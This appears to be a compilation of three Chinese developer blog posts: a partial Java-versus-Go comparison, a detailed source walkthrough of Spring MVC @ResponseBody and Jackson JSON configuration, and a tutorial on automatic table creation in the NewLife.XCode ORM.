输出结果：
加： 0.30000000000000004
减： 0.9900000000000001
乘： 112.99999999999999
除： 1.0012999999999999

go
go 不存在精度丢失问题，可以看代码可知

func main() {
    fmt.Println("加: ", 0.1+0.2)
    fmt.Println("减: ", 1.1-0.11)
    fmt.Println("乘: ", 1.13*100)
    fmt.Println("除: ", 100.13/100)
}

输出结果：
加:  0.3
减:  0.99
乘:  113
除:  1.0013
http Server

java
java的http Server是基于Servlet,应对高并发时的策略是多线程，处理效率一般
代码示例：

class MyServlet extends HttpServlet{
    private static final ResourceBundle lStrings = ResourceBundle.getBundle("javax.servlet.http.LocalStrings");

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String protocol = req.getProtocol();
        String msg = lStrings.getString("http.method_get_not_supported");
        if (protocol.endsWith("1.1")) {
            resp.sendError(405, msg);
        } else {
            resp.sendError(400, msg);
        }

    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String protocol = req.getProtocol();
        String msg = lStrings.getString("http.method_post_not_supported");
        if (protocol.endsWith("1.1")) {
            resp.sendError(405, msg);
        } else {
            resp.sendError(400, msg);
        }

    }
}


go
go 源码是自带http包的，所以无需第三方封装，开发较为简单；应对高并发时的策略是多协程，处理效果较好
代码示例：

import (
    "fmt"
    "net/http"
)

func index_handle(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Whoa,Go is cool!")
}
func main() {
    http.HandleFunc("/", index_handle)
    http.ListenAndServe(":8000", nil)
}

常量与静态变量

java
java 中常量(final) 与 静态(static) 是分开的，常量：只能动态赋值一次后不可改变 静态：类型不变
示例：

//静态
public static String str  = "hello";
//常量
public final String str2 = "hello2";
//不可变量(初始化后不可重新赋值)
public static final String str3 = "hello3";

go
go 没有静态一说，只有常量(const)一说，在初始化后不能改变，其实就相当于 java中的 final + static
示例：

const str string = "hello"
__本章就到这里吧，敬请期待下一讲。(^_^)__
现在是 2019-03-13 22:29:50，各位晚安~

********************************************************************************************************************************************************************************************************
SpringMvc @ResponseBody
 


一.@Response使用条件


二. @Response在最小配置、jackson的jar包情况下，json中包含的日期类型字段都是以时间戳long类型返回


三. Jack序列化对象转为JSON的限制条件


四. @ResponseBody如何工作的


五. Spring偏底层记录.


六.参考文章


 
一. @Response使用条件
1.引入依赖jackson-databind 或者其他类型的json转换，比如gson、fastjson
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.8.1</version>
    </dependency>
2.最小配置,<mvc:annotation-driven/>
最低满足上面两个条件，即可在@RequestMapping的方法上添加注解@ResponseBody，将结果用JSON直接返回给客户端.

 
二. @Response在最小配置、jackson的jar包情况下，json中包含的日期类型字段都是以时间戳long类型返回
直接说结论，各位可以尽管测试，使用jackson的情况下,转换的json日期类型字段都会以时间戳long类型展示;
 jackson最简单的API使用方式普及下，当然你也可以倒数第二行调用 writeValueAsString这样更加简单：
   public static void main(String[] args) throws IOException {
        JsonEncoding encoding = JsonEncoding.UTF8;
        ObjectMapper mapper = new ObjectMapper();
        JsonGenerator generator =mapper.getFactory().createGenerator(new File("E:\\home\\1.txt"),encoding);
        ObjectWriter writer = mapper.writer();
        Date date = new Date();
        writer.writeValue(generator,date);
        generator.flush();
    }
查看输出文件的信息： Spring底层就是按照这个API 调用方式来生成JSON ，我们没有对ObjectMapper做任何配置，所以生成日期类型都是返回其时间戳； 
 SpringMvc 4.3中@ResponseBody时间类型是返回时间戳类型，至于其他版本测试就可以知道是否直接返回时间戳类型；
  
二.1  Jackson Api层面记录如何取消这种时间类型生成方式
下面用mapper代替你的new ObjectMapper()
方式一. mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,false);
                 说明：mapper  configure设置需要在 createGenerator  以及  获取writer之前才有效！
方式二. mapper.setDateFormat(new SimpleDateFormat("yyyy--MM--dd HH:mm:ss"));
                  说明：这种方式扩展性更好，可以日期自定义格式化，相比较方式一更符合开发需求；
方式三. 实体属性上标注注解 @JsonFormat
public static void main(String[] args) throws IOException {
        JsonEncoding encoding = JsonEncoding.UTF8;
        ObjectMapper mapper = new ObjectMapper();
        JsonGenerator generator =mapper.getFactory().createGenerator(new File("E:\\home\\1.txt"),encoding);
        ObjectWriter writer = mapper.writer();
        PrivateMyDate date = new PrivateMyDate();
        writer.writeValue(generator,date);
        generator.flush();
}

static class PrivateMyDate{
  @JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss")
  public Date now=new Date();
}

效果图如下：@JsonFormat是Jackson的，而不是Spring的！

  说明：方式三应该是日常开发中最方便的，只需要在实体类上添加@JsonFormat，可以满足各种类型的日期格式
 

三. Jack序列化对象转为JSON的限制条件
三.1 Jackson API使用注意事项点：
之前偷懒, 属性修饰符、getter方法都没有写 , 误打误撞发现Jackson抛出异常 
com.fasterxml.jackson.databind.JsonMappingException: No serializer found for class xxx and no properties discovered to create BeanSerializer (to avoid exception, disable SerializationFeature.FAIL_ON_EMPTY_BEANS)
当结合Spring @ResponseBody一起使用，那异常可能就是另外一种表现形式(当然下面这种异常不仅仅可能是这个Jackson Api使用注意事项引起的)
java.lang.IllegalArgumentException: No converter found for return value of type: class demo2.MyDate
 
三.1.1异常引起原因:比如尝试序列化Json这样一个实体类，就会抛出第一种异常，在Spring就会抛出第二种异常
public class PrivateMyDate {
    String name="123";
    int age=18;
}
三.1.2 异常原因说明:  Jackson2默认地序列化成JSON，实体类属性或者对应属性getter方法为 public类型，才能够将该属性成功转为Json ; 如果只是少数字段不为public类型，那这些少数字段就不会出现在转换后的Json中；如果所有字段都不是public且没有public的getter方法，就会抛出上面第一种异常 ;
 
三.1.3 异常解决方案:
方案一.最直接的方案
          如果有权操作实体类，给对应实体类添加标准的getter方法(public类型，jackson默认是标准的)
方案二.全局级别方案
          obejctMapper.setVisibility(PropertyAccessor.FIELD, JsonAutoDetect.Visibility.ANY);
           说明:ANY 代表转换成JSON时候  FIELD即属性可以为任意类型，public、protected、default、private类型都可以
方案三.实体级别方案
           实体类上标注 @JsonAutoDetect(fieldVisibility = JsonAutoDetect.Visibility.ANY)即可
 
三.1.4 Jackson2结合Spring4.x实现全局级别的@JsonFormat以及 @JsonAutoDetect
自己修改了下原来<mvc:annotation-driven/>达到了全局级别的效果，不用再在实体类上添加@JsonFormat以及@JsonAutoDetect; 简单说明下原理:新增了MappingJackson2HttpMessageConverter，自己配置了一个ObjectMapper，其中visibility属性篇幅较长，如果遇到第一种异常的话可以加上;
<mvc:annotation-driven>
    <mvc:message-converters>
        <bean id="mappingJackson" class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter">
            <property name="objectMapper">
                <bean class="com.fasterxml.jackson.databind.ObjectMapper">
                    <property name="visibility">
                        <bean class="com.fasterxml.jackson.databind.introspect.VisibilityChecker$Std">
                            <constructor-arg name="getter" value="DEFAULT"/>   <!--getter方法级别的最低修饰符-->
                            <constructor-arg name="isGetter" value="DEFAULT"/>
                            <constructor-arg name="setter" value="DEFAULT"/>   <!--setter方法级别的最低修饰符-->
                            <constructor-arg name="creator" value="DEFAULT"/>  <!--构造器级别的最低修饰符-->
                            <constructor-arg name="field" value="ANY"/>       <!-- 属性级别的最低修饰符 ANY具体查看枚举Visibility-->
                        </bean>
                    </property>
                    <property name="dateFormat">
                        <bean class="java.text.SimpleDateFormat">
                            <constructor-arg name="pattern" value="yyyy-MM-dd"/>
                        </bean>
                    </property>
                    <property name="serializationInclusion" value="NON_NULL"/> <!-- 如果不想序列化NULL的字段,配置这个属性 -->                
                </bean>
            </property>
        </bean>
    </mvc:message-converters>
</mvc:annotation-driven>
基本上到这里，Spring以及Jackson2的配置都已经清楚了，用法也基本了解 @Response返回Json给客户端；这些都是<mvc:annotation-driven/>替我们完成的,下面深入了解下一些知识.
 

四. @ResponseBody如何工作的
先说明下，这章比较无聊，我尽量记录详细些,就从调用完 Controller @RequestMapping方法开始记录
四.1 代码片段位于  org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle
this对象为ServletInvocableHandlerMethod, returnValueHandlers对象为HandlerMethodReturnValueHandlerComposite；returnValueHandlers顾名思义就是方法返回值处理器，
它持有一系列Spring为我们默默注册地HandlerMethodReturnValueHandler，专门用来针对不同@RequestMapping方法返回值，来决定怎么返回给客户端；
比如 ModelAndViewMethodReturnValueHandler用来处理ModelAndView的返回值，而RequestResponseBodyMethodProcessor就是用来处理 标注了@ResponseBody 的返回值；
public void invokeAndHandle(ServletWebRequest webRequest,ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception {
              //invokeForRequest反射执行了Controller的业务方法，还包括请求参数绑定
		Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);
		setResponseStatus(webRequest);
               //业务方法返回值为空，不进一步判断了,设置请求处理标志位为true即可
		if (returnValue == null) {
			if (isRequestNotModified(webRequest) || hasResponseStatus() || mavContainer.isRequestHandled()) {
				mavContainer.setRequestHandled(true);
				return;
			}
		}
		else if (StringUtils.hasText(this.responseReason)) {
			mavContainer.setRequestHandled(true);
			return;
		}

		mavContainer.setRequestHandled(false);
		try {  
               //业务方法返回值不为null，判断如何返回响应
               //返回值处理器对象是HandlerMethodReturnValueHandlerComposite
	this.returnValueHandlers.handleReturnValue(
	    returnValue, getReturnValueType(returnValue), mavContainer, webRequest);
		}
		catch (Exception ex) {
			if (logger.isTraceEnabled()) {
				logger.trace(getReturnValueHandlingErrorMessage("Error handling return value", returnValue), ex);
			}
			throw ex;
		}
	}

四.1.1 代码片段位于org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite#handleReturnValue
首先挑选上面说到的HandlerMethodReturnValueHandler，这个肯定不能随意挑选，肯定有条件的挑选，就像相亲？ 扯远了，挑选到合适的HandlerMethodReturnValueHandlers，它就知道该怎么做了，handleReturnValue处理返回值;
public void handleReturnValue(Object returnValue, MethodParameter returnType,ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {
		HandlerMethodReturnValueHandler handler = selectHandler(returnValue, returnType);
		if (handler == null) {
			throw new IllegalArgumentException("Unknown return value type: " + returnType.getParameterType().getName());
		}
		handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);
}

四.1.2 先看挑选的条件吧，代码位于org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite#selectHandler
this指代HandlerMethodReturnValueHandlerComposite，上面说的Spring默默注册的HandlerMethodReturnValueHandler就是在returnValueHandlers集合中；遍历这个集合，挑选的条件就是：supportsReturnType，而returnType只需要知道是ReturnValueMethodParameter类型，且持有方法的返回值即可；每个HandlerMethodReturnValueHandler的实现类肯定各自实现了supportsReturnType、以及handleReturnValue，这里只记录 RequestResponseBodyMethodProcessor 就是下面会用到的用来解析 @Response 注解的HandlerMethodReturnValueHandler.
private HandlerMethodReturnValueHandler selectHandler(Object value, MethodParameter returnType) {
		boolean isAsyncValue = isAsyncReturnValue(value, returnType);
		for (HandlerMethodReturnValueHandler handler : this.returnValueHandlers) {
			if (isAsyncValue && !(handler instanceof AsyncHandlerMethodReturnValueHandler)) {
				continue;
			}
			if (handler.supportsReturnType(returnType)) {
				return handler;
			}
		}
		return null;
}
 
代码片段位于org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor#supportsReturnType
RequestResponseBodyMethodProcessor的supportsReturnType方法，可以看到符合条件是:@ReuqestMapping方法上标注@ResponseBody 或者 @Controller标注@ResponseBody，当然@RestController这种也是包含注解@ResponseBody;  满足条件就会直接返回这个HandlerMethodReturnValueHandler，然后使用HandlerMethodReturnValueHandler的handleReturnValue.
 
 
四.1.3 挑选完毕之后，调用handleReturnValue方法；代码片段位于org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor#handleReturnValue
inputMessage、outputMessage就是封装了的request以及response对象，最关键的步骤在 writeWithMessageConverters.
public void handleReturnValue(Object returnValue, MethodParameter returnType,
			ModelAndViewContainer mavContainer, NativeWebRequest webRequest)
			throws IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException {

		mavContainer.setRequestHandled(true);
		ServletServerHttpRequest inputMessage = createInputMessage(webRequest);
		ServletServerHttpResponse outputMessage = createOutputMessage(webRequest);

		// Try even with null return value. ResponseBodyAdvice could get involved.
		writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);
	}
四.1.4 代码片段位于org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor#writeWithMessageConverters
writeWithMessageConverters方法省略无关重要部分后：clazz是@RequestMapping方法返回值类型，返回值为null取得是方法声明类型，type取方法声明类型；两者的区别：clazz可能用@RequestMapping方法method的getReturnType,而type是method的getGenericReturnType.   从inputMessage对象中获取原生request，并且getAcceptableMediaTypes方法，且看四.1.5 ，根据一定的策略来分析请求的MediaType ;  getProducibleMediaTypes方法且看四.1.6,  遍历请求头、请求后缀得到的MediaType，以及可以支持写回的MediaType, isCompatibleWith就是进行兼容性判断.   简单来说,比如 producibleMediaTypes 是application/json类型的,请求头或者请求后缀得出来的MediaType得是 application/json或者 */*这样的，才能叫做兼容吧.  兼容性的判断逻辑且看四.1.7 isCompatibleWith . 这里补充下，如果兼容的mediaType是*/*类型的,那就会以application/octet-stream这种形式写回.  选中了兼容的MediaType，后面的分析到四.1.8 记录.
protected <T> void writeWithMessageConverters(T value, MethodParameter returnType,ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)
			throws IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException {

		Class<?> clazz = getReturnValueType(value, returnType);
		Type type = getGenericType(returnType);

		HttpServletRequest servletRequest = inputMessage.getServletRequest();
		List<MediaType> requestedMediaTypes = getAcceptableMediaTypes(servletRequest);
		List<MediaType> producibleMediaTypes = getProducibleMediaTypes(servletRequest, clazz, type);

		//代码略...
		Set<MediaType> compatibleMediaTypes = new LinkedHashSet<MediaType>();
		for (MediaType requestedType : requestedMediaTypes) {
			for (MediaType producibleType : producibleMediaTypes) {
				if (requestedType.isCompatibleWith(producibleType)) {
					compatibleMediaTypes.add(getMostSpecificMediaType(requestedType, producibleType));
				}
			}
		}
		
		List<MediaType> mediaTypes = new ArrayList<MediaType>(compatibleMediaTypes);
		MediaType.sortBySpecificityAndQuality(mediaTypes);

		MediaType selectedMediaType = null;
		for (MediaType mediaType : mediaTypes) {
			if (mediaType.isConcrete()) {
				selectedMediaType = mediaType;
				break;
			}
			else if (mediaType.equals(MediaType.ALL) || mediaType.equals(MEDIA_TYPE_APPLICATION)) {
				selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;
				break;
			}
		}
		
		//代码上部略.....
四.1.5 代码片段位于org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor#getAcceptableMediaTypes
调用了ContentNegotiationManager的resolveMediaTypes方法解析request，来判断请求的MediaType类型.

 
代码片段位于org.springframework.web.accept.ContentNegotiationManager#resolveMediaTypes
this对象指代ContentNegotiationManager，遍历其ContentNegotiationStrategy集合strategies, 调用接口的resolveMediaTypes来解析MediaType.  如果需要自定义解析请求策略，可以实现该接口ContentNegotiationStrategy.  <mvc:annotation-driven/> (spring4.x是这样) 默默为我们注册了两个PathExtensionContentNegotiationStrategy 、HeaderContentNegotiationStrategy，作用分别是用来解析 请求后缀形式、  Http  Accept的请求头.
 
 
四.1.6 代码片段位于 org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor#getProducibleMediaTypes
首先调用request请求的getAttribute获取某些属性HandlerMapping.PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE，这个属性在IDEA通过全局搜索,在RequestMappingInfoHandlerMapping中找到了setAttribute它, 这个设置是因为@RequestMapping(produce={xxxxx})这个时候保存的produce的属性.  this对象指代RequestResponseBodyMethodProcessor，其集合messageConverters也是Spring默默为我们注册的.  allSupportedMediaTypes在RequestResponseBodyMethodProcessor初始化的时候设置上的，当时就是遍历的messageConverters，调用HttpMessageConverter的getSupportedMediaTypes方法，一个个加入到allSupportedMediaTypes中的.    现在又遍历messageConverters，逐个调用canWrite方法，返回true代表符合条件,getSupportMediaTypes得到MediaType的集合，代表可以支持的响应媒体类型 ;
 
 
当前messageConverter集合如下:大部分不是GenericHttpMessageConverters类型的，这类型的canWrite(returnValueClass,null)的具体逻辑两个，一支持返回值类型supports(clazz)，二可以写回null类型媒体类型MediaType;   比如ByteArrayHttpMessageConverter的supports方法就是 byte[].class == clazz，StringHttpMessageConverter的supports方法就是 String.class        == clazz  ; 另外 Jaxb2RootElementHttpMessageConverter的  supports方法就是  判断 返回值类型clazz 上面有注解 XmlRootElement ，而 MappingJackson2HttpMessageConverter       调用objectMapper.canSerialize方法判断能否序列化成JSON处理;
 
 
代码片段位于:org.springframework.http.converter.AbstractHttpMessageConverter#canWrite(java.lang.Class<?>, org.springframework.http.MediaType)
 
 
代码片段位于:org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter#canWrite

 
代码片段位于:org.springframework.http.converter.AbstractHttpMessageConverter#getSupportedMediaTypes
MappingJackson2HttpMessageConverter的getSupportedMediaTypes：默认初始化的时候就支持两种媒体类型了，application/json以及 application/*+json ；

这两种类型是初始化的时候就设置上去的，可以看到下面两种MediaType :application/json  以及 application/*+json

 
四.1.7 isCompatibleWith兼容性判断，代码片段位于:org.springframework.util.MimeType#isCompatibleWith
MediaType是MimeType的子类，比如MediaType为 application/json类型的在MediaType中，application就是 type，而json就是 subType; 判断兼容性逻辑呢：this是请求中的Accpet，代表客户端接受的请求媒体类型,  other此时代表当前可以返回给你的媒体类型；this 对象或者 other对象的 type一方为 *，那两个媒体类型就是兼容的，比如 */subType1 就是兼容任何媒体类型 ； type相等的情况 , subType不存在 +号的情况下 ，有一方子类型为 * ，两个MediaType也是兼容的；两个MediaType subType一致那更不用说了是兼容的，两个媒体子类型不一致 如 application/json和 application/xml就是不兼容的 ； 子类型存在 + 号的情况下，比如application/json和 application/*+json也是不兼容的. 
public boolean isCompatibleWith(MimeType other) {
		if (other == null) return false;
		if (isWildcardType() || other.isWildcardType()) {
			return true;
		}
		else if (getType().equals(other.getType())) {
			if (getSubtype().equals(other.getSubtype())) return true;
			
			// wildcard with suffix? e.g. application/*+xml
			if (this.isWildcardSubtype() || other.isWildcardSubtype()) {

				int thisPlusIdx = getSubtype().indexOf('+');
				int otherPlusIdx = other.getSubtype().indexOf('+');

				if (thisPlusIdx == -1 && otherPlusIdx == -1) {
					return true;
				}
				else if (thisPlusIdx != -1 && otherPlusIdx != -1) {
					String thisSubtypeNoSuffix = getSubtype().substring(0, thisPlusIdx);
					String otherSubtypeNoSuffix = other.getSubtype().substring(0, otherPlusIdx);

					String thisSubtypeSuffix = getSubtype().substring(thisPlusIdx + 1);
					String otherSubtypeSuffix = other.getSubtype().substring(otherPlusIdx + 1);

					if (thisSubtypeSuffix.equals(otherSubtypeSuffix) &&
							(WILDCARD_TYPE.equals(thisSubtypeNoSuffix) || WILDCARD_TYPE.equals(otherSubtypeNoSuffix))) {
						return true;
					}
				}
			}
		}
		return false;
	}
 
四.1.8 代码片段位于:org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor#writeWithMessageConverters
指定了MediaType为application/json, 遍历messageConverters集合，分别调用canWrite方法判断是否支持将返回值写回Response,这次与四.1.5不同的是，指定了MediaType；
this指代RequestResponseBodyMethodProcessor对象，其advice属性为RequestResponseBodyAdviceChain，beforeBodyWrite方法用来处理@JsonView.
addContentDispositionHeader用来满足一定条件时设置Content-Disposition响应头.
准备工作都完成后,调用GenericHttpMessageConverter的write方法,这里完成JSON转换以及写到response、设置响应头的工作.
 
 
四.1.9 代码片段位于:org.springframework.http.converter.AbstractGenericHttpMessageConverter#write
这里并没有开始写回操作,响应头也没有写回,只是记录到HttpOutputMessage的HttpHeaders属性中.

 
代码片段位于:org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter#writeInternal
调用的是Jackson2的API, 其中 JsonGenerator generator = this.objectMapper.getFactory().createGenerator(outputMessage.getBody(), encoding);HttpOutputMessage.getBody方法，给response添加了响应头，并且获取了response的outputStream流， Jackson2转换的对象就在这里直接写到了响应输出流中；方法结束之后，直接调用response的flush，到这里@ResponseBody流程大致跑了一遍.
 
 
四.2 请求json或者xml形式数据两种方式 (1)后缀名限制  (2)请求头限制
前面四.1.5提到支持请求后缀形式解析MediaType,<mvc:annotation-driven/> (spring4.x是这样) 默默为我们注册了两个PathExtensionContentNegotiationStrategy 、HeaderContentNegotiationStrategy. 这两个ContentNegotiationStrategy的实现类.   先看下这两个ContentNegotiationStrategy达到了什么样的效果?
效果图如下:  SpringMvc拦截 / 的所有请求, 但是可以根据  后缀名 .json  .xml来返回对应的结果, 这就是ContentNegotiationStrategy起到的作用;
首先要想实现这种效果,需要的条件有: 1.开启<mvc:annotation-driven /> 
2. 引入第三方json的jar, jackson 或者 gson就可以支持 json ,且不需要自己配置HttpMessageConverter，除此之外的 json 第三方jar需要自己配置 HttpMessageConverter;
3.不引入第三方xml的jar情况下，jdk自带的jaxb，实体类上标注@XmlRootElement即可支持xml ；pom依赖引入 jackson-dataformat-xml 即可使用jackson，将实体类转为xml;
这种情况使用方式: 1.后缀名请求：  url后跟上需要的类型.json 或者 .xml
                          2.请求头Accept：application/json 或者 application/xml 
悄悄说下我的发现,假如不加后缀名请求, 如果Xml、Json都支持，那会先返回Xml结果
 
 
四.2.1 HeaderContentNegotiationStrategy原理记录
代码片段位置:org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes
根据request对象的Accept请求头字符串,转换为MediaType集合，也就是四.1.5的逻辑

 
四.2.2 ServletPathExtensionContentNegotiationStrategy原理记录
代码片段位于:org.springframework.web.accept.PathExtensionContentNegotiationStrategy#getMediaTypeKey
ServletPathExtensionContentNegotiationStrategy父类AbstractMappingContentNegotiationStrategy实现resolveMediaTypes方法，resolveMediaTypes调用resolveMediaTypeKey方法，resolveMediaTypeKey调用getMediaTypeKey方法，其实就是解析了请求的后缀名，比如 json或者xml,  根据后缀名去mediaTypes集合查找对应的MediaType,ServletPathExtensionContentNegotiationStrategy的mediaTypes是解析<mvc:annotation-driven/>时候动态判断jar（jackson gson jaxb这些jar）包添加的，暂时只支持到json / xml这两个，不过也是支持扩展的; 

 

五. Spring偏底层记录.
五.1 MappingJackson2HttpMessageConverter是如何创建，又如何加入到上面四.1的HandlerMethodReturnValueHandlerComposite中?
代码片段位于:org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#afterPropertiesSet
HandlerMethodReturnValueHandlerComposite是RequestMappingHandlerAdapter的属性，其afterPropertiesSet方法最后, getDefaultReturnValueHandlers方法获取到的HandlerMethodReturnValueHandler集合，加入到了returnValueHandlers中；getDefaultReturnValueHandlers有这样一句代码：
handlers.add(new RequestResponseBodyMethodProcessor(getMessageConverters(),this.contentNegotiationManager, this.requestResponseBodyAdvice));   
这里可以看到RequestResponseBodyMethodProcessor的三个重要属性都已经赋值完毕，messageConverters、contentNegotiationManager、requestResponseBodyAdvice，而且都是直接引用的RequestMappingHandlerAdapter对象的属性.  问题就归结于RequestMappingHandlerAdapter的三个属性了.

 
代码片段位于:org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getDefaultReturnValueHandlers
 
 
五.1.1 RequestMappingHandlerAdapter的messageConverters哪里来的？
代码片段位于:org.springframework.web.servlet.config.AnnotationDrivenBeanDefinitionParser#getMessageConverters
<mvc:annotation-driven/>开启之后, AnnotationDrivenBeanDefinitionParser的parse方法进行解析; 解析规则：mvc:annotation-driven下有message-converters子标签，就将这个messageConverter对象加入messageConverters集合,同时,如果message-converters这个子标签的register-defaults属性为true,那把Spring为我们默认创建的一起加入到messageConverters，该register-defaults属性默认为true;  这就意味着 上面我的那种写法其实是两个MappingJackson2HttpMessageConverter，但是自定义加入的HttpMessageConverter会在集合的前端.
  没有message-converters子标签,那就直接使用Spring为我们默认创建的HttpMessageConverter对象,常见的ByteArrayHttpMessageConverter 这些都是Spring默认会添加的,下图就是几个比较复杂的, 比如当前引入了jackson-dataformat-xml这个包，那jackson2XmlPresent就为true,那默认就不会注册jaxb的JaxbRootElementHttpMessageConverter;
比如引入了jackson-databind以及相关jar,那注册的就是MappingJackson2HttpMessageConverter,而不会注册Gson相对应的HttpMessageConverter了;
  这里也就看到了MappingJackson2HttpMessageConverter如何创建的,原来是我们引入了jackson-databind相关的jar包，<mvc:annotation-driven/>就会自动创建;

 
代码片段位于:org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor#RequestResponseBodyMethodProcessor
结合五.1来看，RequestResponseBodyMethodProcessor，验证了四.1.6,RequestResponseBodyMethodProcessor的allSupportedMediaTypes是遍历的messageConverters的getSupportedMediaTypes来的.
 

 
五.1.2 requestResponseBodyAdvice作用简单记录下.
requestResponseBodyAdvice 是Spring帮我们创建的，目前是为了支持@JsonView注解，定义上说是为了在@ResponseBody处理之前进行一些切面操作.
 
五.1.3 contentNegotiationManager
contentNegotiationManager我想我们应该主要关心，什么时候注册的两个四.2的HeaderContentNegotiationStrategy以及ServletPathExtensionContentNegotiationStrategy?
代码片段位于:org.springframework.web.accept.ContentNegotiationManagerFactoryBean#afterPropertiesSet
ContentNegotiationManager是通过FactoryBean ContentNegotiationManagerFactoryBean来实现生成, 在这里就可以发现设置的两种ContentNegotiationStrategy.

 

六.参考文章
 六.1 推荐一个非常有用的网站，学习Jackson很有帮助的网站
https://www.baeldung.com/category/json/jackson/
 
 六.2 推荐一个Firefox上访问StackOverFlow起飞的插件
网站访问StackOverFlow，由于谷歌被墙,  安装插件Decentraleyes，2019.3.13仍在使用，访问到飞起,安装方式自行百度
********************************************************************************************************************************************************************************************************
[NewLife.XCode]反向工程（自动建表建库大杀器）
NewLife.XCode是一个有10多年历史的开源数据中间件，支持nfx/netstandard，由新生命团队(2002~2019)开发完成并维护至今，以下简称XCode。
整个系列教程会大量结合示例代码和运行日志来进行深入分析，蕴含多年开发经验于其中，代表作有百亿级大数据实时计算项目。
开源地址：https://github.com/NewLifeX/X （求star, 656+）
 
大杀器
反向工程是XCode的大杀器，区别于其它ORM的最强功能！
通俗理解：基于XCode开发的应用，无需数据库安装脚本，连接字符串指向哪一台哪一种数据库，系统就自动在上面建库建表！
正式定义：基于实体类的表结构信息，在连接字符串指定的目标数据库上自动执行建库建表、添删改字段、创建索引等操作，支持各种数据库！
应用系统首次启动完成的时候，也是自动建表建库并初始化完成的时候。
反向工程是XCode数万级分表的主要倚仗！
 
创建控制台项目，从Nuget引用NewLife.XCode
创建实体类，模型如下（可参考前面几章来生成实体类）：

 测试代码：

 执行日志：
自始至终，我们没有编写SQL脚本，没有去数据库创建数据表。
代码写完就跑起来，测试通过就部署到正式库。
从日志来看，程序自动下载SQLite驱动，因为我们并没有指定实体类使用哪一种数据库，XCode自动给我们配置了SQLite。（上一章连接字符串部分有讲解）
 
加一行代码把数据库指向MySql：

 执行日志：

同样的首先下载MySql驱动，（当然也可以自己通过nuget引用）。
首次连接数据库时，库名指定School报错，因为根本就不存在这个库。
因此，XCode切换到系统库，开始创建数据库School，并创建数据表和索引。这里完全是MySql语法，不同于上面的SQLite建表语句。
 
感兴趣的同学，还可以试试Oracle和SqlServer等数据库。
 
正向工程
正向工程就是从数据库读取表结构信息，生成模型信息。
我们来试试写几行代码读取上面创建的数据表：

执行日志：

从上面可以看到，读取dal.Tables得到了这个连接的所有表结构信息，输出为Xml时，跟前面用来创建实体类的模型文件极为相似。
其实这就是一个模型文件，只是为了生成实体类的模型文件多增加了几个属性而已。
新生命码神工具XCoder，（https://github.com/NewLifeX/XCoder），其中的数据建模工具，可以导出各种数据库的表结构信息，正是基于dal.Tables来实现。
 
正向工程由3个基本接口构成：

IDataTable。数据表接口，dal.Tables就是IDataTable集合，包括名称、描述等
IDataColumn。数据列接口，每张数据表有多个数据列，包括名称、类型、长度、描述等
IDataIndex。数据索引接口，每张数据表没有或者有多个索引，索引指定包括哪些字段 ，是否唯一

 
反向工程
有了IDataTable，我们就可以主动控制数据表结构。
DAL.SetTables(IDataTable[] tables);
这是反向工程高级用法，实际日常工作中用不到，各个实体类加载时，将会逐个连接进行反向工程检查，正是调用该方法。
 
给上面的数据模型，增加一个字段Code和对应索引：

跑起来：

程序自动为我们添加了字段，以及创建了索引！
前面的几个SHOW，就是XCode的正向工程，取得数据库表结构，然后跟实体类结构对比，不相同时执行反向操作。
 
反向工程设置
大家还记得上一章系统设置中提到的Migration吗？
XCode.config和连接字符串中都支持这个设置。
可用设置项如下：

Off 关闭，不执行反向工程
ReadOnly 只读不执行，异步执行反向工程检查，对比后生成变更DDL写入日志
On 打开，仅新建，默认设置。新建表、增加字段、创建索引等可以执行，禁止修改字段长度类型，禁止删除字段，以免造成数据丢失
Full 完全，修改删除。除了新建表、增加字段、创建索引外，还可以修改字段长度类型、删除字段等，极其危险，慎用

反向工程设计于2008年，10多年经验表明，默认On最合理，不仅满足开发需要，（随时加字段），还避免了字段改变而导致的数据丢失风险；
 
反向工程如此神奇的功能，你想到了什么高端用法吗？我们将在数万级分表分库章节等你！
 
系列教程
NewLife.XCode教程系列[2019版]

增删改查入门。快速展现用法，代码配置连接字符串
数据模型文件。建立表格字段和索引，名字以及数据类型规范，推荐字段（时间，用户，IP）
实体类详解。数据类业务类，泛型基类，接口
功能设置。连接字符串，调试开关，SQL日志，慢日志，参数化，执行超时。代码与配置文件设置，连接字符串局部设置
反向工程。自动建立数据库数据表
数据初始化。InitData写入初始化数据
高级增删改。重载拦截，自增字段，Valid验证，实体模型（时间，用户，IP）
脏数据。如何产生，怎么利用
增量累加。高并发统计
事务处理。单表和多表，不同连接，多种写法
扩展属性。多表关联，Map映射
高级查询。复杂条件，分页，自定义扩展FieldItem，查总记录数，查汇总统计
